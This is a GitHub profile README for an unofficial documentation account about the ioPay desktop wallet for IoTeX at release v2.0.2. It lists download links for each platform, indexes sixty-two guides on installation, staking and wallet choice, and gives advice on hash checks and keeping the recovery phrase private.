![ioPay Wallet](assets/banner-profile.png)

<h1 align="center">ioPay Wallet</h1>

<p align="center"><em>The GitHub page for ioPay Wallet: sixty-two desktop wallet guides for IoTeX, written against release v2.0.2.</em></p>

<p align="center"><a href="#license"><img src="https://img.shields.io/badge/LICENSE-Apache--2.0-0969da?style=for-the-badge&labelColor=0B1733" alt="License: Apache-2.0"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2"><img src="https://img.shields.io/badge/RELEASE-v2.0.2-0969da?style=for-the-badge&labelColor=0B1733" alt="Release: v2.0.2"></a></p>

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux a `.zip` holding a `.deb` and a `.pacman` package. Nothing else is published for this release.

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

## What this page is

This is the documentation account for ioPay Wallet, the desktop wallet for the IoTeX network. The application holds your keys on your own computer, shows a native `io1...` address and an EVM `0x...` address for the same account, and puts staking, the IoTube bridge, swaps and DePIN device income in one window. It runs on Windows, macOS and Linux, and the current release is v2.0.2, published on 19 November 2026. Everything linked from this page describes that release; where a behaviour is not published, the guide says so instead of guessing.

The guides are written for people who already hold IOTX, or are about to. That includes someone installing a desktop wallet for the first time, someone moving a balance off an exchange or out of the mobile app, someone staking across long durations, and someone whose transfer, balance or database has stopped behaving. They are also written for the reader who has never heard of the brand and wants to know what it is before installing anything, which is why the comparison pages exist and why none of them rank wallets by preference.

The account is organised as three collections rather than one long list. Desktop setup and safety carries installation, backup, recovery, hardware signing and transfers. Staking, bridge and DePIN carries what the wallet does with IOTX once it is held. Choosing the right wallet carries the decision pages and the release facts. Each collection opens with its own README, and the first one indexes all sixty-two guides so nothing is reachable only by search.

Two habits run through the writing. The first is verification: the release publishes three files and the pack carries a SHA-256 value for each, so the guides teach the check a reader can actually perform - download, hash, compare - and are equally clear about where that check stops, since a hash confirms the file and says nothing about the code inside it. The second is the recovery phrase rule: the phrase is the account, the app lock is not, and no step in any guide ever needs the phrase typed into a page, a chat or a support form.

## Start here

| Guide | What it answers |
|---|---|
| [What Is ioPay Wallet?](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/what-is-iopay-wallet.md) | The product, its two address forms and the current build, explained in one page. |
| [Install ioPay Wallet on Windows](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/install-iopay-wallet-on-windows.md) | The download check, the installer and the first launch, step by step. |
| [How to Back Up an ioPay Seed Phrase](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md) | How to write the phrase down once, store it offline and prove the backup works. |
| [Spotting Fake ioPay Wallet Downloads](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/spotting-fake-iopay-wallet-downloads.md) | Three files, four checks, and the lookalikes that outrank the real page. |
| [Is ioPay Wallet Safe?](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/is-iopay-wallet-safe-to-use.md) | Custody, what the app protects, and the checks that replace a badge. |
| [How to Stake IOTX in ioPay Wallet](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md) | Delegation, the duration steps and what a staking bucket actually is on IoTeX. |

## The three collections

**[Desktop setup and safety](https://github.com/iopay-project/desktop-setup-and-safety)** is the collection to read first: thirty guides on installing on each platform, writing down and restoring the phrase, telling a real download from a lookalike, connecting a Ledger or Trezor, recovering a locked account, and moving IOTX in and out. Its README indexes all sixty-two guides across the account.

**[Staking, bridge and DePIN](https://github.com/iopay-project/staking-bridge-and-depin)** is the value side: twenty guides on choosing a validator, reading rewards and the unstaking countdown, compounding, the IoTube bridge and its 2026 incident, swap slippage, and device income through ioID.

**[Choosing the right wallet](https://github.com/iopay-project/choosing-the-right-wallet)** is the decision side: twelve guides that compare the desktop build on criteria, explain the difference between this app and the mobile one, identify which desktop build is current, and say where the code, the versions and the support actually live.

## How to read them

1. **Start with the install guide for your platform**, even if you have installed a wallet before; the three packages differ and one is a zip rather than an installer.
2. **Do the backup immediately after the first launch**, then restore from it once. An untested backup is a hope.
3. **Check the version you installed** against the release page, so the guide you are reading matches the build you are running.
4. **Read the transfer guides in order** when moving value in: addresses first, then the send, then the fee.
5. **Use the security guides by symptom**, not in sequence; each one starts from a failure a reader actually reports.

## How the guides are written

Each page answers one question and opens with the answer, so a reader who lands from a search result can stop at the first sentence if that is all they needed. The rest of the page is the sequence behind the answer: what you will see, why it happens, the numbered fix where there is one, what to do when that fix does not work, and how to prevent the problem returning. Pages that touch keys or funds repeat the phrase rule at the point where it matters rather than only in a disclaimer.

Figures carry their source. A chain parameter comes from IoTeX documentation, a version comes from the release page, and a licence comes from the repository. Where the project's own specification and the chain documentation disagree - the unstaking duration is the clearest example - the published documentation figure is used and the conflict is recorded rather than smoothed over. Where nothing is published, the page says nothing is published; an absent checksum is stated as an absent checksum, not implied by silence.

## What this account is not

It is not an official IoTeX property, and none of these pages claims to be. It is not a support desk: there is no ticket system, no mailbox that answers with credentials, and no route that needs the recovery phrase. It is also not a ranking of wallets, a price commentary, or a promise about returns. The DePIN and staking pages explain mechanics and leave projections to a calculator the reader operates with their own numbers.

## Before you install

- **The release is v2.0.2, published 19 November 2026.** Three assets: one `.exe`, one `.dmg`, one `.zip`.
- **SHA-256 values are published in the app README; no signature or audit report is published with the release**, so a hash confirms the file and nothing more.
- **The phrase is written down before the account is funded**, not after.
- **The app lock is a convenience, not a recovery mechanism.** They are different artifacts and they fail differently.

## About

These pages describe ioPay Wallet Desktop as published in the v2.0.2 release and the IoTeX chain behaviour around it. They are documentation, not an endorsement: no claim of IoTeX approval is made, and IoTeX's own documentation lists the mobile app rather than this desktop build. Corrections follow the release.

## License

Apache-2.0, matching the wallet's own licence.

---

[Wallet repository](https://github.com/iopay-project/iopay-desktop-wallet) - [v2.0.2 release](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2) - [All guides](https://github.com/iopay-project/desktop-setup-and-safety)
